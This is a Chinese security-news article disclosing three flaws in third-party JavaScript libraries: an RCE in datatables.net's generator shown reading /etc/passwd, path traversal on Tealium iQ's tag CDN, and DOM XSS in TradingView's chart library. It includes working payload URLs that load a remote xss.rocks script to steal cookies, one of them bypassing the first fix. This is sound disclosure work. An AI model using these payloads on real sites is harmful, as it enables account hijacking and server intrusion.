***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担**

![using third-party js
libraries.png-800x400.png](https://image.3001.net/images/20190618/1560863858_5d08e472cd933.png!small)
**当前，很多网站都会使用第三方特定JavaScript库的方式来增强网站的显示应用功能，通常情况下，这种嵌入到网站中的库可以方便直接地从第三方服务提供商的域中加载，实现对当前网站的优化和功能增强。然而，这种嵌入到很多网站中的第三方库往往会是一个致命的攻击面，可以导致嵌入网站更容易遭受一些潜在攻击。**

本文披露了当前流行的第三方JavaScript库中的三个漏洞，鉴于这三个漏洞的严重性，可能会对嵌入这些流行库的数千家机构网站造成影响。

## 示例1 ：datatables.net中的远程代码执行漏洞（RCE）

[Datatables.net](https://datatables.net/)是一个专门提供表格HTML显示的免费库网站，其官网声称只要在你的网站中嵌入一个存储在cdn.datatables.net的.js或.css文件，就能实现表格HTML化显示。

![01.png](https://image.3001.net/images/20190618/1560863306_5d08e24a902dc.png!small)也就是说，如果大量的互联网网站嵌入了这个存储在cdn.datatables.net的.js或.css文件作为网站资源库，那么，只要这两个资源库文件存在漏洞，那么相应的引用嵌入网站也就可能受到影响了。

以下面这个澳大利亚政府网站为例，它在其中就嵌入引用了存储在cdn.datatables.net的.js库文件-jquery.dataTables.min.js：

![02.png](https://image.3001.net/images/20190618/1560863346_5d08e272cf24f.png!small)当浏览datatables.net官网服务后可知，其中的js库文件会向远端应用<https://editor.datatables.net/generator/>发起请求，这个远端应用会在后台生成并测试一些需要显示的HTML表格。每次请求生成一个新表格之后，相应地也会生成并返回给目标网站一个php文件。我们利用.datatables.net这种生成php文件的过滤漏洞，可以在其中写入某些参数，实现一定程度的RCE攻击，例如，我们可在下述php创建机制的红框内写入RCE
Payload：

![03.png](https://image.3001.net/images/20190618/1560863383_5d08e29736061.png!small)在$_GET(1)中，把1换为cat
/etc/passwd，看看会发生什么：

![04.png](https://image.3001.net/images/20190618/1560863395_5d08e2a377908.png!small)就这样，datatables.net中的密码文件/etc/passwd就被直接读取出来了，另外，经验证，可利用该漏洞读取
cdn.datatables.net上其它敏感文件。这种第三方库提供商的RCE加文件读取的漏洞让人浮想联翩，当然，嵌入这些库文件的大量网站，其受影响程度也想想都后怕了。

## 漏洞示例2：Tealium iQ上的路径遍历漏洞（Path Traversal）

[Tealium iQ](https://tealium.com/resource/datasheet/tealium-iq/)公司提供的智能标签管理解决方案，专门对数据标签进行有效管理，只要一个Tealitma
IQ标签，就可取代网站上所有商家的标签，实现对营销解决方案的在线控制。如以下Uber网站就引用嵌入了Tealium iQ的标签服务：

![05.png](https://image.3001.net/images/20190618/1560863463_5d08e2e754a29.png!small)

该服务会去请求一个名为tags.tiqcdn.com的Tealium iQ .js库文件：

> <https://tags.tiqcdn.com/utag/><Account Name>/<Profile Name>/prod/utag.js

这里存在的漏洞是，Tealium iQ标签服务对网站输入的配置文件名（Profile Name）数据处理不当，问题在于，Tealium iQ远端服务允许 /
和 . 两种特殊字符在Profile Name中存在。

可以利用这两种字符来操控那些加载配置文件的目录，例如，如果配置文件名称中有../../utag/uber/main，那么，其相应的js代码就会向上传到tags.tiqcdn.com中形成<https://tags.tiqcdn.com/utag/uber/main/prod/utag.js>这样，它将被嵌入到任何利用Tealium
iQ的Uber网站页面中。

该漏洞已在Uber漏洞众测项目和其它Bug赏金平台提交上报过，在此，我编写了以下简单的代码，通过它可以更改任意tags.tiqcdn.com上的js文件，实现对tags.tiqcdn.com的目录遍历。

![06.png](https://image.3001.net/images/20190618/1560863523_5d08e323d796d.png!small)该漏洞可能会对Uber、Microsoft、Cisco和Inte的大多数网站造成影响。  

## 漏洞示例3：TradingView图表库中的DOM Based XSS漏洞

[TradingView](https://www.tradingview.com/HTML5-stock-forex-bitcoin-charting-library/)提供专门的流行图表绘制显示服务，在金融和加密货币交易平台应用相较广泛，可以说，大多的加密货币交易平台都使用了它提供的图表服务库显示了在线交易信息。然而，2018年9月24日，名为Victor
Zhu的安全研究人员[发现了TradingView的一个高危DOM Based
XSS漏洞](https://zhuzhuuu.com/vulnerablity/2018-09/tradingview-xss)，所有引用嵌入其库文件的加密货币网站都受到影响。

任何引用嵌入TradingView库文件的网站中都会存在一个可被公开访问的，样式为tv-chart.html的文件，这个html文件通过location.hash参数来初始化交易图表，图表初始化完成之后，指向以下类型页面的iframe链接将被加载到网站页面上：

> [https://example.com/tradingview/en-tv-> chart.x.html#symbol=BTC_ETH&interval=180&widgetbar=%7B%22details%22%3Afalse%2C%22watchlist%22%3Afalse%2C%22watchlist_settings%22%3A%7B%22default_symbols%22%3A%5B%5D%7D%7D&drawingsAccess=%7B%22type%22%3A%22black%22%7D&locale=en&uid=tradingview_36472&clientId=tradingview.com&userId=public_user&chartsStorageVer=1.0&debug=false&timezone=Asia%2FTaipei&theme=Dark](https://example.com/tradingview/en-> tv-> chart.x.html#symbol=BTC_ETH&interval=180&widgetbar=%7B%22details%22%3Afalse%2C%22watchlist%22%3Afalse%2C%22watchlist_settings%22%3A%7B%22default_symbols%22%3A%5B%5D%7D%7D&drawingsAccess=%7B%22type%22%3A%22black%22%7D&locale=en&uid=tradingview_36472&clientId=tradingview.com&userId=public_user&chartsStorageVer=1.0&debug=false&timezone=Asia%2FTaipei&theme=Dark)

漏洞就在于，TradingView库文件的一个第三方图表加载函数中，该函数从目标网站输入的indicatorsFileparameter中获取一个链接，并传输到了$.getScript()中：

> D ? $.getScript(urlParams.indicatorsFile).done(function() {...})

![07.png](https://image.3001.net/images/20190618/1560863655_5d08e3a72461a.png!small)那么，可以在其中的获取链接上做文章，在其中注入远程js文件，实现恶意目的，如：

> <https://example.com/tradingview/en-tv-> chart.x.html#disabledFeatures=>[]&enabledFeatures=[]&indicatorsFile=//xss.rocks/xss.js

当用户访问了这条链接之后，远程的xss.rocks/xss.js就会加载运行读取用户Cookie：

![08.png](https://image.3001.net/images/20190618/1560863684_5d08e3c4c47b3.png!small)当该漏洞被披露后，TradingView释放了一个新版本的库文件进行替代修复，其中之前负责加载第三方图表的函数被做了修改替换，修改后的函数如下：

![09.png](https://image.3001.net/images/20190618/1560863699_5d08e3d3a3845.png!small)但是，这种修复方法依然存在漏洞，在添加uid=urlParams参数时，可以使用thecustomIndicatorsUrl参数复现之前出现的漏洞，构造的最终Payload如下：

> <https://example.com/tradingview/en-tv-> chart.x.html#disabledFeatures=>[]&enabledFeatures=[]&customIndicatorsUrl=//xss.rocks/xss.js&uid=urlParams

之后，TradingView再次对库文件进行了修复，终于完全堵塞了漏洞。但是，一些加密货币交易平台仍然在用存在漏洞的库文件版本，经对当前所有的加密货币交易平台进行了测试后发现，包括CoinMarketCap和一些交易量较大的90多家平台仍然存在TradingView库文件的上述Dom
Based XSS漏洞，TradingView对这些平台进行了及时告知，但却：

> 46家交易平台选择忽视该漏洞通报；
>
> 44家交易平台进行了回复并询问了详细技术细节；
>
> 19家交易平台最终修复了该漏洞；
>
> 7家交易平台建议对该漏洞给予奖励。

## 总结

作为安全人员来说，当测试Web应用安全性时，应该把其中使用的第三方产品或程序考虑在内，它们同样至关重要；作为网站运营方来说，要慎重使用嵌入引用的第三方库文件。

 ***参考来源：[dmsec](https://dmsec.io/hacking-thousands-of-websites-via-third-party-javascript-libraries/)，clouds编译，转载请注明来自FreeBuf.COM**  

